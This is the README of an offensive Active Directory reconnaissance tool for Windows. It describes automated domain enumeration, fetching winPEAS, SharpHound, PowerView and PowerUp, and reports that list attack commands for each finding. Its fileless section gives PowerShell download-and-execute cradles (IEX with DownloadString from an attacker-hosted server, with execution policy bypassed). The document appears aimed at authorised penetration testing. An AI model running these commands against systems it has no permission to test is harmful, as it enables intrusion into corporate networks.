# AD Recon

Automated Windows Active Directory enumeration tool.
Runs on a target machine, collects everything important about the domain, and generates two reports.

> For educational use only. Run only on machines you own or have permission to test.

---

## How to Run

Pick the row that matches your situation:

| You have... | Run this |
|---|---|
| Python on the target | `python main.py` |
| PowerShell only | `powershell -ExecutionPolicy Bypass -File launch.ps1` |
| CMD only | `launch.bat` |
| A shell but no files on disk | See **Fileless** below |

### Fileless (no file transfer needed)

Host the tool on your attacker machine:
```bash
python3 -m http.server 8080
```

Then paste this into PowerShell on the target:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:8080/launch.ps1')
```

Or from CMD:
```
powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:8080/launch.ps1')"
```

---

## What It Does

**No setup required.** Just run it. The tool will:

1. **Auto-detect** your environment — domain, DC IP, current user, privilege level, internet access
2. **Ask you 3 questions** — what credentials you have, confirm the domain/DC, where to save output
3. **Decide automatically** which tools to run based on your answers
4. **Download and run** winPEAS, SharpHound, PowerView, Seatbelt, PowerUp (skips any it can't get)
5. **Generate your reports**

Total runtime: **2 to 10 minutes** depending on domain size.

---

## Output

Everything is saved to `./output/` (or wherever you chose).

| File | What it is |
|---|---|
| `report1_findings.html` | All findings, sorted by severity with color coding |
| `report2_attack_commands.html` | Exact attack commands for every finding |
| `report_combined.md` | Both reports in one Markdown file |
| `raw/` | Raw output from each tool |
| `raw/bloodhound_data_*.zip` | Load this into BloodHound |

Open the HTML files in any browser.

---

## The Two Reports

### Report 1 — Findings

- **Intelligence table** at the top: users, domain admins, computers, kerberoastable accounts, hashes found, password policy, trusts, GPOs — everything at a glance
- **Findings list** below, color coded by severity (same style as linPEAS):
  - 🔴 `CRITICAL` — immediate exploitation possible
  - 🟠 `HIGH` — significant risk, likely exploitable
  - 🟡 `MEDIUM` — worth investigating
  - 🔵 `LOW` / ⚪ `INFO` — context and enumeration data
- Click any finding to expand it and see the evidence

### Report 2 — Attack Commands

- One section per finding with step-by-step commands
- **Orange text** = values pre-filled from your environment (domain, DC IP, usernames)
- **`<RED TEXT>`** = placeholders you need to fill in yourself
- Includes a BloodHound load guide with the ZIP file location and the most useful queries to run

---

## Requirements

- Windows target machine
- Internet optional — tools download automatically if available, skipped if not
- Seatbelt must be compiled manually ([GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)) and placed in `tools/Seatbelt.exe` — everything else downloads automatically
